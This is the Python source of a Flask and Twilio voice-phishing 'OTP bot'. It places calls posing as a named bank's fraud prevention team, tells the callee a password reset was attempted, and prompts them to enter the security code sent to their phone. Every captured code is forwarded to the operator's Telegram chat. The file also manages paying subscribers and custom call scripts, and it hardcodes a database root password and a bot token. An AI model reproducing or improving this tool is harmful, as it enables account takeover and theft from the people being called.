
from random import choices
from secrets import choice
from urllib import response
from flask import Flask, request , abort, render_template
from flask_mysqldb import MySQL
from datetime import datetime
import yaml
import time
import os
import requests
from twilio.twiml.voice_response import Gather, VoiceResponse, Dial
import os
from twilio.rest import Client
import sys


from bot import blen
from pyngrok import ngrok, conf




app = Flask(__name__ )


# conf.get_default().config_path = 'ngrok.yml'

mysql_host = 'localhost'
mysql_user = 'root'
mysql_password = '2020Blkout6080!'
mysql_db = 'Users'
# config db
app.config['MYSQL_HOST'] = mysql_host
app.config['MYSQL_USER'] = mysql_user
app.config['MYSQL_PASSWORD'] = mysql_password
app.config['MYSQL_DB'] = mysql_db

bank = ''
chatidd = ''
first = ''
second = ''
final = ''
clen = ''
bblen = ''

token = '5421535686:AAHYdLH0TAjZf1x47JU0QZ_vO5NHSrno7Gs'


mysql = MySQL(app)
@app.route('/users', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        userDetails = request.form
        chatid = userDetails['chatid']
        user = userDetails['username']
        sub = userDetails['sub']
        added = userDetails['added']
        print(user+' ~ Added')
        cur = mysql.connection.cursor()
        cur.execute("INSERT INTO subs(chatid, username, sub, added) VALUES(%s, %s, %s, %s)",(chatid, user, sub, added))
        mysql.connection.commit()
        cur.close()
        return 'success'
    return render_template('index.html')
username = 'binfraudin'
@app.route("/verify", methods=['GET', 'POST'])
def verify():
    if request.method == 'POST':
        userDetails = request.form
        chatid = userDetails['chatid']
        bank2 = userDetails['bank']
        flen = userDetails['codelen']
        cur = mysql.connection.cursor()
        cur.execute("INSERT INTO input(chatid,bank,codelen) VALUES(%s, %s, %s)",(chatid,bank2,flen))
        mysql.connection.commit()
    return render_template('call.html')

@app.route("/add", methods=['GET', 'POST'])
def add():
    if request.method == 'POST':
        userDetails = request.form
        global chatidd
        chatidd = userDetails['chatid']
        global bank
        bank = userDetails['bank']
        global bblen
        bblen = userDetails['codelen']
        cur3 = mysql.connection.cursor()
        update = ("UPDATE input SET bank =%s, codelen =%s WHERE chatid = %s")
        val = (bank,bblen,chatidd)
        cur3.execute(update,val)
        # mysql.connection.commit()
        # conn = mysql.connect(user=mysql_user, passwd=mysql_password, db=mysql_db)
        # cur = conn.cursor()
        # query = ("SELECT bank FROM input WHERE chatid = %(chatidd)s")
        # go = cur.execute(query, {'chatid': chatidd})
        # nob = cur.fetchone()
    return render_template('call.html')

ring = '🔔 Ringing'

@app.route("/custom1", methods=['GET', 'POST'])
def custom1():
    if request.method == 'POST':
        userDetails = request.form
        chat = userDetails['chatid']
        mybank = userDetails['bank']
        first = userDetails['first']
        second = userDetails['second']
        final = userDetails['final']
        codelen = userDetails['codelen']
        cur = mysql.connection.cursor()
        cur.execute("INSERT INTO cust(userid,bank,first,second,final,code) VALUES(%s, %s, %s, %s, %s, %s)",(chat,mybank,first,second,final,codelen))
        mysql.connection.commit()
    return render_template('custom.html')

@app.route("/custom", methods=['GET', 'POST'])
def custom():
    if request.method == 'POST':
        userDetails = request.form
        global chatidd
        chatidd = userDetails['chatid']
        global bank
        bank = userDetails['bank']
        global first
        first = userDetails['first']
        global second
        second = userDetails['second']
        global final
        final = userDetails['final']
        global clen
        clen = userDetails['codelen']

        cur3 = mysql.connection.cursor()
        update = ("UPDATE cust SET bank =%s, first =%s, second =%s, final =%s, code =%s WHERE userid = %s")
        val = (bank,first,second,final,clen,chatidd)
        cur3.execute(update, val)
        mysql.connection.commit()
        conn = mysql.connect(user=mysql_user, passwd=mysql_password, db=mysql_db)
        cur = conn.cursor()
        # query = ("SELECT first FROM cust WHERE chatid = %(chatidd)s")
        # go = cur.execute(query, {'userid': chatidd})
        # nob = cur.fetchone()
    return render_template('custom.html')

ended = '⛔ Call Ended'
answer = '🤳 On Call'
declined = '⛔ Call Declined'


@app.route('/voice', methods=['GET', 'POST'])
def voice():
    resp = VoiceResponse()
    gather = Gather(num_digits=1, action='/aanswer')
    gather.say(f'''This is {bank}'s fraud prevention team, We are calling you because there hase been a password reset attempt on your account. . If this was you , please press 1. . If this was not you , please press 2.''')
    resp.append(gather)
    resp.redirect('/aanswer')
    return str(resp)

        
@app.route('/aanswer', methods=['GET', 'POST'])
def aanswer():
    msg = '📟 Send Code Now'
    resp = VoiceResponse()
    if 'Digits' in request.values:
        choice = request.values['Digits']
        msg = '📟 Send Code Now'
        if choice == '2':
            # resp.say(f'''We take security seriously. To secure your account we has sent you a {bblen} digit security code to the phone number listed on the account.''')
            requests.post('https://api.telegram.org/bot'+str(token)+'/sendMessage?chat_id='+str(chatidd)+'&text='+answer)
            resp.redirect('/gather')
            return str(resp)
        elif choice == '1':
            resp.say('You are all set, Thank you for securing youre account')
            resp.redirect('/gather')
            return str(resp)
        # else:
        #     requests.post('https://api.telegram.org/bot'+str(token)+'/sendMessage?chat_id='+str(chatidd)+'&text='+ended)
        #     resp.redirect('/gather')
        #     return str(resp)
    else:
        requests.post('https://api.telegram.org/bot'+str(token)+'/sendMessage?chat_id='+str(chatidd)+'&text='+declined)
        return

@app.route('/gather', methods=['GET', 'POST'])
def gather():
    msg = '📟 Send Code Now'
    resp = VoiceResponse()
    code = Gather(num_digits=bblen, action='/code',finishonkey="#", timeout="30")
    code.say(f'''We take security seriously. To secure your account we has sent you a {bblen} digit security code to the phone number listed on the account. Please enter the {bblen} digit code''')
    resp.append(code)
    requests.post('https://api.telegram.org/bot'+str(token)+'/sendMessage?chat_id='+str(chatidd)+'&text='+msg)
    resp.redirect('/code')
    return str(resp)    

@app.route('/code', methods=['GET', 'POST'])
def code():
    choice = request.values['Digits']
    text = f'''✅ OTP CODE: {choice}'''
    finish = 'Call Completed ~ Press /cancel Before Moving On'
    requests.post('https://api.telegram.org/bot'+str(token)+'/sendMessage?chat_id='+str(chatidd)+'&text='+text)
    resp = VoiceResponse()
    resp.say('You are all set, Thank you for securing youre account. Goodbye') 
    resp.hangup()
    time.sleep(2)
    print(request.values)
    requests.post('https://api.telegram.org/bot'+str(token)+'/sendMessage?chat_id='+str(chatidd)+'&text='+finish)
    return str(resp)

# SERVICE
@app.route('/service', methods=['GET', 'POST'])
def service():
    resp = VoiceResponse()
    gather = Gather(num_digits=1, action='/sanswer')
    gather.say(f'''This is {bank}'s fraud prevention team, We are calling you because there has been a password reset attempt on your account. . If this was you , please press 1. . If this was not you , please press 2.''')
    resp.append(gather)
    resp.redirect('/sanswer')
    return str(resp) 

@app.route('/sanswer', methods=['GET', 'POST'])
def sanswer():
    msg = '📟 Send Code Now'
    resp = VoiceResponse()
    if 'Digits' in request.values:
        choice = request.values['Digits']
        msg = '📟 Send Code Now'
        if choice == '2':
            # resp.say(f'''We take security seriously. To secure your account we has sent you a {bblen} digit security code to the phone number listed on the account.''')
            requests.post('https://api.telegram.org/bot'+str(token)+'/sendMessage?chat_id='+str(chatidd)+'&text='+answer)
            resp.redirect('/sgather')
            return str(resp)
        elif choice == '1':
            resp.say('You are all set, Thank you for securing youre account')
            resp.redirect('/sgather')
            return str(resp)
        # else:
        #     requests.post('https://api.telegram.org/bot'+str(token)+'/sendMessage?chat_id='+str(chatidd)+'&text='+ended)
        #     resp.redirect('/gather')
        #     return str(resp)
    else:
        requests.post('https://api.telegram.org/bot'+str(token)+'/sendMessage?chat_id='+str(chatidd)+'&text='+declined)
        return


@app.route('/sgather', methods=['GET', 'POST'])
def sgather():
    resp = VoiceResponse()
    msg = '📟 Send Code Now'
    code = Gather(num_digits=bblen, action='/scode', finishonkey="#", timeout="30")
    code.say(f'''We take security seriously. To secure your account we has sent you a {bblen} digit security code to the phone number listed on the account. Please enter the {bblen} digit code followed by the pound sign''')
    requests.post('https://api.telegram.org/bot'+str(token)+'/sendMessage?chat_id='+str(chatidd)+'&text='+msg)
    resp.append(code)
    resp.redirect('/scode')
    return str(resp)    

@app.route('/scode', methods=['GET', 'POST'])
def scode():
    time.sleep(5)
    choice = request.values['Digits']
    text = f'''✅ OTP CODE: {choice}'''
    finish = 'Call Completed ~ Press /cancel Before Moving On'
    requests.post('https://api.telegram.org/bot'+str(token)+'/sendMessage?chat_id='+str(chatidd)+'&text='+text)
    resp = VoiceResponse()
    resp.say('You are all set, Thank you for securing youre account. Goodbye') 
    requests.post('https://api.telegram.org/bot'+str(token)+'/sendMessage?chat_id='+str(chatidd)+'&text='+finish)
    return str(resp)


# CUSTOM 
@app.route('/customs', methods=['GET', 'POST'])
def customs():
    resp = VoiceResponse()
    answer = '🤳Call Answered'
    requests.post('https://api.telegram.org/bot'+str(token)+'/sendMessage?chat_id='+str(chatidd)+'&text='+answer)
    gather = Gather(num_digits=1, action='/cgather')
    gather.say(f'''{first}''')
    resp.append(gather)
    resp.redirect('/customs')
    return str(resp) 

@app.route('/cgather', methods=['GET', 'POST'])
def cgather():
    resp = VoiceResponse()
    if 'Digits' in request.values:
        choice = request.values['Digits']
        msg = '📟 Send Code Now'
        if choice == '1':
            resp.say('You are all set, Thank you for securing youre account')
            return str(resp)
        else:
            time.sleep(1)
            code = Gather(num_digits=clen, action='/ccode', finishonkey="#", timeout="30")
            code.say(f'''{second}''')
            requests.post('https://api.telegram.org/bot'+str(token)+'/sendMessage?chat_id='+str(chatidd)+'&text='+msg)
            resp.append(code)
            return str(resp)
    resp.redirect('/ccode')
    return str(resp)    

@app.route('/ccode', methods=['GET', 'POST'])
def ccode():
    choice = request.values['Digits']
    text = f'''✅ OTP CODE: {choice}'''
    finish = 'Call Completed ~ Press /cancel Before Moving On'
    requests.post('https://api.telegram.org/bot'+str(token)+'/sendMessage?chat_id='+str(chatidd)+'&text='+text)
    time.sleep(1)
    resp = VoiceResponse()
    time.sleep(1)
    resp.say(f'''{final}''') 
    time.sleep(2)
    resp.hangup()
    requests.post('https://api.telegram.org/bot'+str(token)+'/sendMessage?chat_id='+str(chatidd)+'&text='+finish)
    return str(resp)


if __name__ == "__main__":
    app.run(host = '0.0.0.0', debug=False)
